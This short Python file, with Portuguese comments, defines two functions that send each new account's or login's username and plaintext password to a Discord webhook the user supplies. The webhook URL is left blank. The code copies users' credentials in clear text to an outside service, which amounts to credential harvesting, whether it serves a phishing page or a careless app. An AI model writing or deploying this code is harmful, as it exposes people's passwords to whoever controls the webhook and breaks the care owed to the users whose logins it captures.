import requests

def notifier_cr(nomeC, senhaC):
    webhook = " " # Sua discord webhook.

    data = {
        "content": f"# NOVA CRIAÇÃO DE CONTA DETECTADA\n - Nome: {nomeC}\n - Senha: {senhaC}"
    }

    response = requests.post(webhook, json=data)



def notifier_lg(nomeL, senhaL):
    webhook = " " # Sua discord webhook.

    data = {
        "content": f"# NOVO LOGIN DETECTADO\n - Nome: {nomeL}\n - Senha: {senhaL}"
    }

    response = requests.post(webhook, json=data)

